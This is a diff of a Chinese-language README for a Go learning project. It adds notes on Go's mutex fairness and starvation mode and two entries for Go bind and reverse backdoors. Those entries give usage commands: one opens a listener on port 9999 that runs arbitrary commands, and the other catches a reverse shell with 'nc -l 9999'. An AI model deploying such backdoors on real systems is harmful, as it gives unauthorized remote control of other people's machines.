@@ -13,8 +13,11 @@
 * 两种cache淘汰策略 lru.go (nginx,redis,squid中都有lru的身影）
 * 内存对齐在golang中的表现 (证明cpu读取内存是按块读取的)
 * golang shell tools (golang实现的交互式shell，实现一个简易版的交互终端)
+* golang 实现一个正向后门 (backdoor,基于go的正向后门)
+* golang 实现一个反向后门 (backdoor,基于go的反向后门)
 * golang实现一致性hash (从单节点走向分布式节点)
-* golang实现类似nginx基于权重的upstream的轮询调度
+* golang实现类似nginx基于权重的upstream的轮询调度（负载均衡）
+* golang的互斥锁如何实现公平
 * etcd watch机制的补充 (微服务)
 * 微服务系统中的优雅升级
 * 讨论rpc && 调用链追踪 
@@ -399,11 +402,28 @@ d | int64 | 8 | 8
 以上过程由于字节对齐原因，
 也就是说CPU读取内存是一块一块读取的，而不是一次读取一个offset，所以造成了两次结果不一致。
 
-### golang shell tools
+### golang shell tools (golang实现的交互式shell，实现一个简易版的交互终端)
 + [run a golang shell in the command](https://github.com/LockGit/Go/blob/master/shell.go)
 ```
 本项目shell文件夹下
 使用golang实现的shell工具
+```
+
+### golang 实现一个正向后门 (backdoor,基于go的正向后门)
+```
+本项目backdoor目录下
+例如：
+    服务端执行：go run backdoor_server.go 0:9999 开启后门程序，等待连接
+    客户端执行：go run backdoor_client.go 0:9999 链接后门，执行任意命令
+```
+
+### golang 实现一个反向后门 (backdoor,基于go的反向后门)
+```
+本项目backdoor_reverse目录下
+例如：
+    客户端执行：nc -l 9999 客户端监听自己的9999端口，等待shell反弹
+    服务端执行：go run backdoor_reverse.go 0:9999 服务端将shell反弹至客户端监听的端口
+与正向后门的区别是反向后门客户端自己需要提前做好端口监听等待shell反弹
 ```
 
 ### golang实现一致性hash (从单节点走向分布式节点)
@@ -414,12 +434,39 @@ d | int64 | 8 | 8
 虚拟节为一个真实节点对应多个虚拟节点。虚拟节点扩充了节点的数量，解决了节点较少的情况下数据容易倾斜的问题。  
 ```
 
-### golang实现类似nginx基于权重的upstream的轮询调度
+### golang实现类似nginx基于权重的upstream的轮询调度（负载均衡）
 ```
 参看本项目下的round_node文件夹下的算法实现
 实际场景中有很多基于权重的选择节点算法，比如nginx的加权轮询，参看本项目下的round_node中的算法实现
 1，每个节点用它们的当前值加上自己的权重。
 2，选择当前值最大的节点为选中节点，并把它的当前值减去所有节点的权重总和。     
+```
+
+### golang的互斥锁如何实现公平
+```
+初版的Mutex：
+Russ Cox在2008年在github commit记录中是提交第一版的Mutex实现。
+通过cas对Mutex结构体的key字段进行加一, 如果key的值是从0加到1, 则直接获得了锁。否则通过semacquire进行sleep, 被唤醒的时候就获得了锁。
+
+2012年，commit dd2074c8 做了一次大的改动：
+将waiter count(等待者的数量)和锁标识分开来(内部实现还是合用使用state字段)，新来的goroutine占优势，会有更大的机会获取锁。
+
+2015年，commit edcad863
+Go1.5中mutex实现为全协作式的，增加了spin机制，一旦有竞争，当前goroutine就会进入调度器。在临界区执行很短的情况下可能不是最好的解决方案。
+
+2016年，commit 0556e262
+Go1.9中增加了饥饿模式，让锁变得更公平，不公平的等待时间限制在1毫秒，并且修复了一个大bug,唤醒的goroutine总是放在等待队列的尾部会导致更加不公平的等待时间。
+
+目前mutex实现是相当的复杂的，互斥锁有两种状态：正常状态和饥饿状态。
+在正常状态下，所有等待锁的goroutine按照FIFO顺序等待。唤醒的goroutine不会直接拥有锁，而是会和新请求锁的goroutine竞争锁的拥有。
+新请求锁的goroutine具有优势：它正在CPU上执行，而且可能有好几个，所以刚刚唤醒的goroutine有很大可能在锁竞争中失败。
+在这种情况下，这个被唤醒的goroutine会加入到等待队列的前面。 如果一个等待的goroutine超过1ms没有获取锁，那么它将会把锁转变为饥饿模式。
+在饥饿模式下，锁的所有权将从unlock的gorutine直接交给交给等待队列中的第一个。
+新来的goroutine将不会尝试去获得锁，即使锁看起来是unlock状态, 也不会去尝试自旋操作，而是放在等待队列的尾部。
+如果一个等待的goroutine获取了锁，并且满足一以下其中的任何一个条件：
+(1)它是队列中的最后一个；
+(2)它等待的时候小于1ms。它会将锁的状态转换为正常状态。
+正常状态有很好的性能表现，饥饿模式也是非常重要的，因为它能阻止尾部延迟的现象。
 ```
 
 ### etcd watch机制的补充 (微服务)
